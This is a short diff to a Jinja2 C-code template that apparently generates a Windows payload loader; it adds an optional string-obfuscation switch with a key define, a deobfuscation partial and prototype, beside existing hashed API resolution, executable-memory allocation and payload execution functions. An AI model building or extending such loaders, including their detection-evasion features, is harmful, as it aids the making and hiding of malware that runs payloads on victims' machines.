@@ -12,6 +12,9 @@
 #include <stdio.h>
 #include <debugapi.h>
 {% endif %}
+{% if obfuscate_strings == 'true' %}
+#define OBFUSCATION_KEY {{ obfuscation_key }}
+{% endif %}
 
 // We're using DEBUG_PRINT macro if debug mode is selected
 {% if debug_mode %}
@@ -26,6 +29,9 @@ char debug_buffer[512];
 {% endif %}
 
 // --- DYNAMICALLY INCLUDE PARTIALS ---
+{% if obfuscate_strings == 'true' %}
+    {% include 'partials/deobfuscate_string.c.j2' %}
+{% endif %}
 {% if api_resolver == 'hashed' %}
     {% include 'partials/api_resolver_hashed.c.j2' %}
 {% else %}
@@ -49,6 +55,9 @@ BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize);
 void* AllocateExecutableMemory(SIZE_T size);
 void ExecutePayload(void* exec_mem, const unsigned char* payload, SIZE_T payload_len);
 void ResolveAPIs();
+{% if obfuscate_strings == 'true' %}
+void DeobfuscateString(unsigned char* data, size_t len);
+{% endif %}
 
 // --- Main Logic ---
 void Run() {
